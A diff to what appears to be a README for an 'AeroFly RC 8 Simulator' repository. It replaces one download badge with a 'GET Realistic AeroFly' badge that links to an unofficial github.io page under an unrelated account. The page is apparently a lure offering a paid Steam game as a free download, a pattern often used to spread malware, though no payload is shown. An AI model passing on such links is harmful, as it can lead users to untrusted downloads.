@@ -6,11 +6,7 @@
   <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/1523450/header.jpg?t=1712080025" width="820" alt="AeroFly RC 8 Simulator">
 </div>
 
-<p align="center">
-  <a href="https://realistic-aerofly-rc.github.io/.github">
-    <img src="https://img.shields.io/badge/Download_AeroFly_RC8-1b2838?style=for-the-badge&logo=steam&logoColor=white" alt="Download AeroFly RC 8">
-  </a>
-</p>
+[![GET Realistic AeroFly](https://img.shields.io/badge/GET%20%E2%80%94%20Realistic-AeroFly-0078D6?style=for-the-badge&logoColor=white)](https://liciousartchinlove03.github.io/.github/Realistic-AeroFly)
 
 ---
 
